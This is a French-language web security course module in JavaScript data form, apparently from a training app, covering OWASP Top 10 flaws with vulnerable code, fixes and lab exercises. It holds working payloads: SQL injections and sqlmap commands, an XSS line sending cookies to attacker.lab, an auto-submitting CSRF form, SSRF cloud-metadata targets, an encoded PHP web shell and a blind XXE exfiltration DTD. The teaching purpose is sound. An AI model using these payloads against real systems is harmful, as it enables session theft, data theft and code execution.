export default {
  id: 'm4',
  num: 4,
  title: "Analyse & Exploitation Didactique des Vulnérabilités",
  short: "OWASP Top 10",
  icon: "🧪",
  xp: 600,
  duration: 120,
  summary: "Comprendre, détecter, exploiter en laboratoire et corriger les vulnérabilités web majeures : injections, XSS, CSRF, SSRF, LFI, XXE, IDOR, contrôle d'accès et upload.",
  objectives: [
    "Expliquer le mécanisme, l'impact et la remédiation de chaque famille de vulnérabilités",
    "Construire des charges utiles adaptées au contexte (SQL, HTML, XML, URL)",
    "Valider une vulnérabilité avec une preuve d'impact minimale en lab",
    "Écrire le correctif correspondant (requêtes préparées, encodage, allowlist, tokens)"
  ],
  blocks: [
    {
      t: 'callout', v: 'legal', title: "Cadre de ce module",
      x: "Toutes les manipulations ci-dessous sont destinées à des applications volontairement vulnérables (DVWA, Juice Shop, WebGoat, bWAPP) ou à des cibles explicitement autorisées. Les charges utiles sont fournies à titre pédagogique : les rejouer sur un système réel sans autorisation est une infraction."
    },
    {
      t: 'table',
      head: ['Rang 2021', 'Catégorie OWASP', 'Risque principal'],
      rows: [
        ['A01', "Broken Access Control", "Accès à des données/actions d'autrui"],
        ['A02', "Cryptographic Failures", "Fuite de secrets, données en clair"],
        ['A03', "Injection", "SQL, NoSQL, OS, LDAP, XSS (selon les référentiels)"],
        ['A04', "Insecure Design", "Logique métier contournable"],
        ['A05', "Security Misconfiguration", "Debug, en-têtes, comptes par défaut"],
        ['A06', "Vulnerable & Outdated Components", "Bibliothèques non patchées"],
        ['A07', "Identification & Authentication Failures", "Sessions, MFA, énumération"],
        ['A08', "Software & Data Integrity Failures", "Désérialisation, CI/CD, mises à jour"],
        ['A09', "Security Logging & Monitoring Failures", "Détection impossible"],
        ['A10', "SSRF", "Accès aux services internes via le serveur"]
      ]
    },
    { t: 'h', x: "4.1 Injection SQL" },
    {
      t: 'p',
      x: "Une injection SQL survient quand une donnée utilisateur est <strong>concaténée dans une requête</strong> au lieu d'être transmise comme paramètre. L'attaquant peut modifier la structure de la requête, lire d'autres tables, contourner l'authentification ou, selon les droits du compte, écrire et exécuter des commandes."
    },
    {
      t: 'code', lang: 'php', title: "Code vulnérable vs corrigé",
      x: `// VULNÉRABLE : concaténation directe
$sql = "SELECT * FROM users WHERE login='" . $_POST['login'] . "'";
$res = mysqli_query($conn, $sql);

// Payload : ' OR '1'='1' --
// Requête obtenue :
// SELECT * FROM users WHERE login='' OR '1'='1' -- '

// CORRIGÉ : requête préparée (PDO)
$stmt = $pdo->prepare("SELECT id, password_hash FROM users WHERE login = :login");
$stmt->execute([':login' => $_POST['login']]);
$user = $stmt->fetch();`
    },
    {
      t: 'table',
      head: ['Type', 'Comment ça marche', 'Indice de détection'],
      rows: [
        ['In-band (UNION)', "On ajoute un UNION SELECT pour faire apparaître d'autres colonnes", "Réponses contenant des données inattendues"],
        ['Error-based', "On provoque une erreur contenant le résultat", "Messages SQL détaillés"],
        ['Blind boolean', "Vrai/faux via une condition, page différente", "Différence de contenu/taille selon AND 1=1 / 1=2"],
        ['Time-based', "On introduit un délai conditionnel", "Réponse anormalement lente (SLEEP 5)"],
        ['Out-of-band', "Exfiltration via DNS/HTTP sortant", "Requêtes DNS vers un domaine contrôlé"]
      ]
    },
    {
      t: 'term',
      title: "Validation manuelle (lab)",
      x: [
        { c: "curl -s \"http://dvwa.lab/vulnerabilities/sqli/?id=1'&Submit=Submit\"", o: ["You have an error in your SQL syntax; check the manual...", "→ confirmation : injection error-based"] },
        { c: "curl -s \"http://dvwa.lab/vulnerabilities/sqli/?id=1' AND 1=1-- -\"", o: ["First name: admin", "Surname: admin", "→ vrai"] },
        { c: "curl -s \"http://dvwa.lab/vulnerabilities/sqli/?id=1' AND 1=2-- -\"", o: ["(aucun résultat)", "→ faux : injection booléenne confirmée"] },
        { c: "sqlmap -u \"http://dvwa.lab/vulnerabilities/sqli/?id=1&Submit=Submit\" --cookie=\"PHPSESSID=...; security=low\" --batch --dbs", o: ["available databases [2]:", "[*] dvwa", "[*] information_schema"] }
      ]
    },
    {
      t: 'callout', v: 'danger', title: "Impacts réels",
      x: "Lecture de toute la base (identifiants, données personnelles), contournement d'authentification, modification ou suppression de données, écriture de fichiers si FILE_PRIV est accordé, parfois exécution de commandes (xp_cmdshell, COPY TO PROGRAM). Une SQLi sur un compte à privilèges élevés peut compromettre le serveur entier."
    },
    {
      t: 'mini',
      items: [
        { v: 'lime', h: 'Remédiation', p: "Requêtes préparées/paramétrées systématiques. ORM correctement utilisé. Compte DB à privilèges minimaux. Validation d'entrée en complément, jamais en remplacement." },
        { v: 'cyan', h: 'Détection', p: "Fuzzer les paramètres avec des quotes, surveiller les erreurs et les variations de temps. Scanner avec sqlmap en lab, puis valider manuellement." },
        { v: 'red', h: 'À éviter', p: "Échappement maison par addslashes, WAF seul, messages d'erreur détaillés en production, concaténation « contrôlée »." }
      ]
    },
    { t: 'h', x: "4.2 Cross-Site Scripting (XSS)" },
    {
      t: 'p',
      x: "Le XSS injecte du code JavaScript dans une page vue par un autre utilisateur. Le navigateur ne distingue pas le script légitime du script injecté : il s'exécute avec l'origine de l'application, donc avec accès aux cookies non protégés, au DOM et aux actions de la victime."
    },
    {
      t: 'table',
      head: ['Type', 'Vecteur', 'Persistance', 'Exemple'],
      rows: [
        ['Reflected', "Paramètre renvoyé dans la réponse", "Non", "/search?q=<script>alert(1)</script>"],
        ['Stored', "Donnée enregistrée (commentaire, profil)", "Oui", "Commentaire contenant <img onerror=…>"],
        ['DOM-based', "JavaScript client écrit dans un sink", "Variable", "location.hash → innerHTML"],
        ['Mutation XSS', "Réinterprétation par le parseur HTML", "Variable", "Balises malformées après sanitisation"]
      ]
    },
    {
      t: 'code', lang: 'html', title: "Sinks dangereux et variantes de contexte",
      x: `<!-- VULNÉRABLE -->
<div id="out"></div>
<script>
  document.getElementById('out').innerHTML = location.hash.slice(1);
</script>

<!-- Payload -->
#<img src=x onerror="fetch('https://attacker.lab/?c='+document.cookie)">

<!-- Attribut : sortir de la valeur -->
<input value="USER_INPUT">
<!-- Payload : " autofocus onfocus="alert(1) -->

<!-- Contexte JS : chaîne -->
<script>var name = "USER_INPUT";</script>
<!-- Payload : ";alert(1);// -->

<!-- CORRIGÉ : texte, pas de HTML -->
element.textContent = userInput;
// ou sanitisation robuste côté serveur + CSP`
    },
    {
      t: 'callout', v: 'tip', title: "Ne testez pas avec alert(1) uniquement",
      x: "Les filtres bloquent souvent <code>alert</code>. Utilisez une preuve non destructive et contextualisée : <code>console.log(document.domain)</code>, un callback vers votre serveur de lab, ou l'altération visible d'un élément. Documentez le contexte exact (HTML, attribut, JS, URL, CSS)."
    },
    {
      t: 'ul',
      x: [
        "<strong>Encodage de sortie contextuel</strong> : HTML entity, attribut, JavaScript, URL, CSS — chaque contexte a son encodage.",
        "<strong>Sanitisation HTML</strong> avec une bibliothèque éprouvée (DOMPurify) si le HTML riche est nécessaire.",
        "<strong>CSP</strong> stricte avec nonces ou hashes, <code>object-src 'none'</code>, <code>base-uri 'none'</code>.",
        "<strong>Cookies</strong> <code>HttpOnly</code> + <code>Secure</code> + <code>SameSite</code> pour limiter l'impact.",
        "<strong>Frameworks</strong> : l'auto-échappement (React, Angular, Vue) protège par défaut, sauf usage explicite de <code>dangerouslySetInnerHTML</code> / <code>v-html</code> / <code>bypassSecurityTrustHtml</code>."
      ]
    },
    { t: 'h', x: "4.3 CSRF" },
    {
      t: 'p',
      x: "Le CSRF force le navigateur d'une victime authentifiée à envoyer une requête que l'application accepte comme légitime. Le navigateur ajoute automatiquement les cookies de session ; si l'application ne vérifie pas l'origine de la demande, l'action passe."
    },
    {
      t: 'code', lang: 'html', title: "Formulaire CSRF minimal",
      x: `<form action="https://bank.lab/transfer" method="POST" id="f">
  <input name="to" value="ATTAQUANT">
  <input name="amount" value="5000">
</form>
<script>document.getElementById('f').submit();</script>

<!-- Protection : jeton anti-CSRF + SameSite -->
<!--
  <input type="hidden" name="csrf_token" value="...">
  Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
-->`
    },
    {
      t: 'p',
      x: "<strong>Défenses :</strong> jeton synchronisé imprévisible lié à la session, vérification de <code>Origin</code>/<code>Referer</code>, cookies <code>SameSite=Lax</code> ou <code>Strict</code>, et <strong>confirmation utilisateur</strong> pour les actions sensibles. Le CSRF ne concerne pas que les formulaires : les requêtes JSON avec <code>Content-Type: application/json</code> peuvent aussi passer si le serveur accepte du texte ou si CORS est mal configuré."
    },
    { t: 'h', x: "4.4 SSRF" },
    {
      t: 'p',
      x: "La SSRF (Server-Side Request Forgery) fait émettre une requête par le <strong>serveur</strong> vers une destination choisie par l'attaquant. Elle permet d'atteindre des services internes non exposés, des métadonnées cloud, voire des fichiers locaux."
    },
    {
      t: 'code', lang: 'http', title: "Cibles classiques en lab",
      x: `POST /api/fetch HTTP/1.1
Host: app.lab
Content-Type: application/json

{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
{ "url": "http://127.0.0.1:6379/" }
{ "url": "file:///etc/passwd" }
{ "url": "http://internal-admin.lab:8080/" }`
    },
    {
      t: 'ul',
      x: [
        "<strong>Allowlist</strong> de domaines/schémas (https uniquement), résolution DNS puis vérification de l'IP avant connexion.",
        "Bloquer les plages privées, loopback, link-local et les adresses de métadonnées ; <strong>revalider après redirection</strong>.",
        "Désactiver les schémas inutiles (<code>file://</code>, <code>gopher://</code>, <code>dict://</code>).",
        "IMDSv2 sur AWS, identité managée à privilèges minimaux, segmentation réseau sortante.",
        "Ne pas renvoyer le corps brut de la réponse interne à l'utilisateur."
      ]
    },
    { t: 'h', x: "4.5 LFI / RFI" },
    {
      t: 'code', lang: 'php', title: "Local File Inclusion",
      x: `// VULNÉRABLE
include($_GET['page'] . '.php');

// URL : /index.php?page=../../../../etc/passwd%00
// Wrappers utiles en lab :
// php://filter/convert.base64-encode/resource=../config.php
// data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
// expect://id  (si extension chargée)

// CORRIGÉ : allowlist stricte
$pages = ['home' => 'pages/home.php', 'about' => 'pages/about.php'];
$page = $pages[$_GET['page']] ?? $pages['home'];
include($page);`
    },
    {
      t: 'p',
      x: "La LFI lit des fichiers locaux (configuration, clés SSH, logs). Combinée à un <strong>log poisoning</strong> ou à un wrapper <code>php://input</code>, elle mène souvent à l'exécution de code. La RFI, plus rare, inclut un fichier distant et permet l'exécution directe."
    },
    { t: 'h', x: "4.6 XXE" },
    {
      t: 'code', lang: 'xml', title: "Entités externes",
      x: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck><productId>&xxe;</productId></stockCheck>

<!-- Exfiltration blind via DTD externe -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.lab/evil.dtd">
  %dtd;
]>`
    },
    {
      t: 'p',
      x: "<strong>Défenses :</strong> désactiver la résolution d'entités externes et les DTD (<code>libxml_disable_entity_loader(true)</code>, <code>XMLConstants.FEATURE_SECURE_PROCESSING</code>), utiliser des parseurs sûrs, préférer JSON, limiter la taille des documents. En Java : <code>disallow-doctype-decl=true</code>."
    },
    { t: 'h', x: "4.7 Contrôle d'accès défaillant & IDOR" },
    {
      t: 'p',
      x: "L'<strong>IDOR</strong> (Insecure Direct Object Reference) est un cas particulier de contrôle d'accès manquant : l'application utilise un identifiant fourni par le client sans vérifier que l'utilisateur y a droit. Remplacer <code>?id=42</code> par <code>?id=43</code> suffit parfois à lire la facture d'autrui."
    },
    {
      t: 'code', lang: 'http', title: "Test IDOR méthodique",
      x: `GET /api/invoices/1042 HTTP/1.1
Authorization: Bearer <token_alice>

HTTP/1.1 200 OK
{ "id": 1042, "user": "alice", "amount": 120.00 }

# Remplacer par l'ID de bob (sans changer de token)
GET /api/invoices/1043 HTTP/1.1
Authorization: Bearer <token_alice>
→ 200 + facture de bob = IDOR confirmé`
    },
    {
      t: 'ul',
      x: [
        "Vérifier l'autorisation <strong>côté serveur à chaque requête</strong>, pas seulement dans l'UI.",
        "Utiliser des identifiants non devinables ne remplace pas le contrôle : UUID ≠ autorisation.",
        "Appliquer le <strong>moindre privilège</strong> et un modèle d'accès par propriétaire/tenant.",
        "Tester systématiquement : changement d'ID, de tenant, de rôle, méthode HTTP, en-têtes <code>X-User-Id</code>, paramètres masqués."
      ]
    },
    { t: 'h', x: "4.8 Open Redirect" },
    {
      t: 'code',
      lang: 'http',
      title: "Redirection ouverte",
      x: `GET /login?next=https://evil.lab/phish HTTP/1.1
Host: app.lab

HTTP/1.1 302 Found
Location: https://evil.lab/phish`
    },
    {
      t: 'p',
      x: "Utilisée pour le phishing (URL de confiance), le vol de jetons OAuth et le contournement de filtres. <strong>Défense :</strong> allowlist de destinations, chemins relatifs uniquement, warning interstitiel, validation stricte du schéma et de l'hôte."
    },
    { t: 'h', x: "4.9 Authentification & sessions" },
    {
      t: 'table',
      head: ['Faiblesse', 'Symptôme', 'Correctif'],
      rows: [
        ['Énumération de comptes', "Messages/temps différents", "Réponse générique, délai constant"],
        ['Brute force', "Aucun verrouillage", "Rate limiting, CAPTCHA, MFA, lockout progressif"],
        ['Fixation de session', "ID conservé après login", "Régénérer l'ID à l'authentification"],
        ['Jeton faible', "Séquentiel/predictible", "CSPRNG ≥128 bits"],
        ['Session éternelle', "Pas d'expiration", "Timeout idle/absolu, révocation"],
        ['MFA contournable', "Code non lié à la session", "Lier le challenge, anti-replay, rate limit"],
        ['Stockage faible', "MD5/SHA1 sans sel", "Argon2id, bcrypt, scrypt"]
      ]
    },
    { t: 'h', x: "4.10 Upload de fichiers" },
    {
      t: 'p',
      x: "Un upload mal contrôlé mène à l'exécution de code (web shell), au XSS stocké, au déni de service ou à l'écrasement de fichiers. La seule vérification du <code>Content-Type</code> ou de l'extension est insuffisante : ces valeurs sont contrôlées par le client."
    },
    {
      t: 'ul',
      x: [
        "Vérifier le <strong>contenu réel</strong> (magic bytes) et ré-encoder les images.",
        "Générer un <strong>nom aléatoire</strong>, supprimer l'extension ou forcer une extension sûre.",
        "Stocker <strong>hors du webroot</strong> ou dans un bucket avec Content-Disposition: attachment.",
        "Allowlist d'extensions et de types MIME côté serveur, taille maximale, analyse antivirus.",
        "Servir les fichiers depuis un domaine distinct (sandbox) et avec <code>X-Content-Type-Options: nosniff</code>."
      ]
    },
    { t: 'h', x: "4.11 Atelier 1 : contourner un login (SQLi)" },
    {
      t: 'p',
      x: "Le formulaire ci-dessous simule une application vulnérable. Observez la requête générée, testez une injection, puis activez la correction pour comparer."
    },
    { t: 'lab', id: 'sqli' },
    { t: 'h', x: "4.12 Atelier 2 : XSS et encodage" },
    {
      t: 'p',
      x: "Un livre d'or enregistre votre message. En mode vulnérable, le simulateur montre ce que le navigateur interpréterait (sans exécuter de code). En mode sécurisé, le même contenu est encodé."
    },
    { t: 'lab', id: 'xss' }
  ],
  quiz: 'q4'
};
